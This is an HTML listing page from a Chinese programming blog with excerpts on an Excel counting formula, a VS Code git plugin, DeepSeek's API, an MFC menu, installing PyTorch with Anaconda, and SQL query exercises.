			excel怎么对非数字求和汇总？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		如：学生小王的成绩为：A+，A，A+，A，B，B-……想得到的成绩汇总求和为：2A+,2A,1B,1B-
如果在低版本里，用公式计算可能相当复杂，但是有了TEXTJOIN函数和UNIQUE函数，这个问题就好办多了。
计算公式：
=TEXTJOIN(",",,UNIQUE(COUNTIF(A1:F1,A1:F1)&amp;A1:F1,1))
公式解析：
COUNTIF(A1:F1,A1:F1)&amp;A1:F1， 用COUNTIF函数计算A1:F1里每一个数据的数量，然后与这些数据连接起来，这样每个数据前面就有了A1:F1中这个数据分别有几个，
但是这样计算下来，数据是有重复的，如2A+，需要将重复数据去除，用UNIQUE函数就可以，由于生成的内存数据是横向的，需要是按来列去除重复，UNIQUE函数需要设置第二个参数，
UNIQUE(COUNTIF(A1:F1,A1:F1)&amp;A1:F1,1)
最后，用TEXTJOIN函数将这些去重复的数据合并到一起，就得到了需要的去除重复数据的统计结果。
=TEXTJOIN(",",,UNIQUE(COUNTIF(A1:F1,A1:F1)&amp;A1:F1,1))
UNIQUE函数是在excel2021版及以上版本支持的，低于excel2021版需要另想其它办法。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7580a2023597fe15dd2148dec6045cc9/" rel="bookmark">
			Vscode git 插件
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		超好用的git记录 软件
安装之后，鼠标在哪一行就可以看最新一次是谁提交的，真的超好用！！！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/38748af8a3f0c3944254ffdce6e6c7b7/" rel="bookmark">
			深入体验DeepSeek：性价比高的AI模型
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在众多的人工智能模型中，DeepSeek 因其高效的性价比和强大的API支持，正在成为开发者和技术爱好者的新宠。
最近，我开始使用 MemoAI 进行视频转译和思维导图总结，尝试了多种大模型后，发现 DeepSeek 在性能和成本效益上都非常出色。
接下来我会简单分享下我使用 DeepSeek 的经验，特别是它的API功能和如何在不同场景中应用它。
DeepSeek的应用场景 目前，DeepSeek还处于内测阶段，主要提供两种应用场景：Chat和Code。
Chat：
这是一个标准的对话使用场景，功能上与 Kimi 相似，但在处理对话时显示出了更快的响应速度和更高的准确性。这使得 DeepSeek 成为处理日常对话和客户支持查询的理想选择。
Code：
专为开发者设计，Code 场景可以理解和生成代码，极大地提高了编程效率。无论是快速生成代码草稿还是帮助调试，DeepSeek 都表现出色。
如何使用DeepSeek的API DeepSeek的API是其最大的卖点之一，提供了极大的灵活性和扩展性。
下面是如何注册和使用DeepSeek API的步骤：
访问API开放平台：首先，登录DeepSeek的API管理界面。
创建API Key：
点击API Keys选项。
选择“创建API Key”，在弹出的窗口中输入API Key的名称，通常是你打算在哪里使用这个Key。
输入名称并点击创建。完成后，系统会生成一个API Key。
保存API Key：
请确保将生成的Key值保存在安全的地方，因为你不会再有机会重新复制这个Key。如果丢失，你需要创建一个新的Key。
DeepSeek 不仅为开发者提供了强大的API支持，还通过其Chat和Code场景，为各种应用提供了强大的AI支持。
最后的最后 感谢你们的阅读和喜欢，我收藏了很多技术干货，可以共享给喜欢我文章的朋友们，如果你肯花时间沉下心去学习，它们一定能帮到你。
因为这个行业不同于其他行业，知识体系实在是过于庞大，知识更新也非常快。作为一个普通人，无法全部学完，所以我们在提升技术的时候，首先需要明确一个目标，然后制定好完整的计划，同时找到好的学习方法，这样才能更快的提升自己。
这份完整版的大模型 AI 学习资料已经上传CSDN，朋友们如果需要可以微信扫描下方CSDN官方认证二维码免费领取【保证100%免费】
一、全套AGI大模型学习路线 AI大模型时代的学习之旅：从基础到前沿，掌握人工智能的核心技能！
二、640套AI大模型报告合集 这套包含640份报告的合集，涵盖了AI大模型的理论研究、技术实现、行业应用等多个方面。无论您是科研人员、工程师，还是对AI大模型感兴趣的爱好者，这套报告合集都将为您提供宝贵的信息和启示。
三、AI大模型经典PDF籍 随着人工智能技术的飞速发展，AI大模型已经成为了当今科技领域的一大热点。这些大型预训练模型，如GPT-3、BERT、XLNet等，以其强大的语言理解和生成能力，正在改变我们对人工智能的认识。 那以下这些PDF籍就是非常不错的学习资源。
四、AI大模型商业化落地方案 这份完整版的大模型 AI 学习资料已经上传CSDN，朋友们如果需要可以微信扫描下方CSDN官方认证二维码免费领取【保证100%免费】
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f2c503f846ff933114347d5c212b5646/" rel="bookmark">
			MFC工控项目实例之一主菜单制作
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、本项目用在WIN10下安装的vc6.0兼容版实现。创建项目名为SEAL_PRESSURE的MFC对话框。在项目res文件下添加相关256色ico格式图片。
2、项目名称：密封压力试验机
主菜单名称：
系统参数 SYS_DATA
系统测试 SYS_TEST
选择型号 TYP_CHOICE
开始试验 TES_START
试验报告 TES_REPORT
系统介绍 SYS__INTRODUCE
退出系统 SYS_EXIT
3、主要用到CButtonST类具体参见本人写的《MFC用CButtonST类实现图片透明按钮(免费源码下载)》
这里给出相关项目截图及主要代码。
4、SEAL_PRESSUREDlg.h中相关代码
class CSEAL_PRESSUREDlg : public CDialog { // Construction public: CSEAL_PRESSUREDlg(CWnd* pParent = NULL);	// standard constructor CFont m_bFont,m_lFont,m_sFont,m_mFont,m_smFont,m_slFont,m_lhFont; // Dialog Data //{{AFX_DATA(CSEAL_PRESSUREDlg) enum { IDD = IDD_SEAL_PRESSURE_DIALOG }; CButtonST	m_TYP_CHOICE; CButtonST	m_TES_START; CButtonST	m_SYS_TEST; CButtonST	m_SYS_EXIT; CButtonST	m_SYS_DATA; CButtonST	m_SYS__INTRODUCE; CButtonST m_TES_REPORT; //}}AFX_DATA ... }; 5、SEAL_PRESSUREDlg.cpp中相关代码
CSEAL_PRESSUREDlg::CSEAL_PRESSUREDlg(CWnd* pParent /*=NULL*/) : CDialog(CSEAL_PRESSUREDlg::IDD, pParent) { m_hIcon = AfxGetApp()-&gt;LoadIcon(IDR_MAINFRAME); m_lFont.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f2c503f846ff933114347d5c212b5646/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a69b1341f5db26527622a35976a85ae1/" rel="bookmark">
			手把手教你使用anaconda安装pytorch环境（适合新手）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		手把手视频教程在【手把手带你安装Anaconda和Pytorch(适合新手_5分钟)-哔哩哔哩】 https://b23.tv/SwdU7cE 一.首先先检查自己的显卡驱动有没有问题 如果你右键电脑有（nvidia控制面板）则不要以下操作
没有的话需要进行以下操作
（右键此电脑，找到管理然后打开）
找到设备管理器
找到显示适配器（这里会有你的显卡型号）
根据以上的信息以后我们就可以对应我们的显卡去英伟达官网上去找相对应的显卡驱动更新或者下载了。
显卡驱动的下载地址
安装好了显卡驱动以后，我们按下win+R组合键，打开cmd命令窗口，输入如下的命令
nvidia-smi 可以看到驱动的版本是527.56；最高支持的CUDA版本是12.0版本，我们就可以根据这个信息来安装环境了。
二.anaconda的安装 去官网下载anaconda的安装包Anaconda | Anaconda Distribution
安装
这一步（add）切记选上
这样我们的anaconda就安装好了
三.pytorch的安装 进入到anaconda prompt
执行代码
conda env list 执行完代码你可以看到你在anaconda下建立的虚拟环境（这是我已经创建好的有paddle、pytorch等)
如果你是第一次安装好的话 那么你只会有一个base环境
这时候我们创建我们自己的pytorch环境（这里我们可以指定python版本号，例如我的是python3.9）
conda create -n pytorch python=3.9 它会让你配置相应环境包 输入y即可（y代表yes）
这个时候我们的pytorch环境就建立好了，但是我们需要进去配置深度学习相应的包
首先我们得进去pytorch环境中去
conda activate pytorch 下载相关的环境包是比较慢的，所以我们给环境换源,在pytorch环境下执行如下的命名给环境换清华源。
conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/free/ conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/main/ conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud/pytorch/ conda config --set show_channel_urls yes 这时我们再打开pytorch的官网（PyTorch），选择我们的版本
复制好 到我们的pytorch环境下执行
conda install pytorch torchvision torchaudio pytorch-cuda=11.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a69b1341f5db26527622a35976a85ae1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bbe1cf97ce3303eee62c0b968a9ece23/" rel="bookmark">
			基础—SQL—DQL（数据查询语言）案例练习
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、需求 0、emp 表的初始数据 1、查询年龄为20,21,22,23岁的员工信息。 SELECT * FROM emp WHERE gender='女'AND age IN(20,21,22,23); 2、查询性别为男，并且年龄在20-40岁(含)以内的姓名为三个字的员工。 SELECT * FROM emp WHERE gender='男' AND age BETWEEN 20 AND 40 AND name LIKE '___'; 3、统计员工表中,年龄小于60岁的，男性员工和女性员工的人数。 SELECT gender,COUNT(*) FROM emp WHERE age&lt;60 GROUP BY gender; 4、查询所有年龄小于等于35岁员工的姓名和年龄，并对查询结果按年龄升序排序，如果年龄相同按入职时间降序排序。 SELECT name,age FROM emp WHERE age&lt;=35 ORDER BY age ASC,entrydate DESC; 这里特别注意：分清楚，GROUP BY 和 ORDER BY 的区别，不要弄混淆了，当排序查询时，第一个字段相等时，才进行第二个字段的排序
检验一下
5、查询性别为男，且年龄在20-40岁(含)以内的前5个员工信息，对查询的结果按年龄升序排序，年龄相同按入职时间升序排序。 SELECT * FROM emp WHERE gender='男' AND (age BETWEEN 20 AND 40) ORDER BY age ASC ,entrydate ASC LIMIT 0,5; 这里面写成 LIMIT 5 也行
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/bbe1cf97ce3303eee62c0b968a9ece23/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/page/325/">«</a>
	<span class="pagination__item pagination__item--current">326/621</span>
	<a class="pagination__item pagination__item--next btn" href="/page/327/">»</a>
</div>

			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程大咖.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://www.w3counter.com/tracker.js?id=151347"></script>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>